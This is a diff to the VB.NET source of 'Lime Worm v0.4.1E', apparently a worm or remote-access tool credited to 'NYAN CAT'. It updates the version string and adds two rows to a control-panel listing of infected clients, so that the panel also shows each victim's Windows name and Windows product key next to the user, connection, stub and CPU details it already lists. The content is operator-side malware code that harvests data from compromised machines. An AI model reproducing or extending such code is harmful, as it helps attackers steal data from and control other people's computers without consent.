@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on MAR./17/2018        ##
+'##        N Y A N   C A T  |||   Updated on MAR./18/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -68,7 +68,7 @@ Public Class Form1
             End
         End Try
 
-        Me.Text = "Lime Worm v0.4.1D"
+        Me.Text = "Lime Worm v0.4.1E"
 
         Try
             If Not IO.Directory.Exists(Application.StartupPath + "\" + "Wallpaper") Then
@@ -217,6 +217,8 @@ Public Class Form1
 
                     D.ListView1.Items.Add("ID ").SubItems.Add(A(1))
                     D.ListView1.Items.Add("User ").SubItems.Add(A(2))
+                    D.ListView1.Items.Add("Windows Name ").SubItems.Add(A(12))
+                    D.ListView1.Items.Add("Windows Key ").SubItems.Add(A(13))
                     D.ListView1.Items.Add("Connection ").SubItems.Add(A(11))
                     D.ListView1.Items.Add("Stub ").SubItems.Add(A(3))
                     D.ListView1.Items.Add("CPU ").SubItems.Add(A(4))
